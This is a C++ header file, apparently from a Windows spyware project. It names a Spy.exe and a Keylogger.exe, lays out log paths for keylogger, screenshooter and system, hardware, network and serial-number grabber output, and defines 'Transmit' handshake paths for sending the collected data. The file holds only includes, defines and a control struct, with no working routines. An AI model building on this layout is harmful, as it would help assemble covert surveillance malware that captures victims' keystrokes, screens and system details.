#pragma once
#include <iostream>
#include <fstream>
#include <Windows.h>
#include <tchar.h>
#include <TlHelp32.h>
#include <pthread.h>
#include <ctime>
#include <map>
#include <gdiplus.h>
#include <direct.h>
#include <string>
#pragma warning(disable : 4996)
#pragma comment(lib,"wsock32.lib")
#pragma comment(lib, "pthreadVSE2.lib")
#pragma comment (lib, "mswsock.lib")
#pragma comment(lib, "GdiPlus.lib")
using namespace std;
using namespace Gdiplus;

#define library "pthreadVSE2.dll"
#define spy "Spy.exe"
#define logpath "SpyLog//Spy.txt"
#define configuration "Config.ksb"
#define loghw "GrabberLog//HardwareLog.txt"
#define logsc "GrabberLog//SampleSrviceConfigLog.txt"
#define logsi "GrabberLog//SystemInfoLog.txt"
#define logni "GrabberLog//NetworkInformationLog.txt"
#define loges "GrabberLog//SerialLog.txt"
#define logsp "GrabberLog//ScanProcessLog.txt"
#define logkl "KeyloggerLog//KeyloggerLog.txt"
#define schname "ScreenshooterLog//ScreenShoot"
#define gfolder "GrabberLog"
#define klfolder "KeyloggerLog"
#define schfolder "ScreenshooterLog"
#define spyfolder "SpyLog"
#define transmit "Transmit"
#define finish "Transmit//finish"
#define request "Transmit//request"
#define confirm "Transmit//confirm"
#define klexe "Keylogger.exe"


struct control
{
	unsigned int period[6];
	bool stop;
	bool run[6];
	bool keylog;
	bool run_s;
	unsigned int period_s;
};
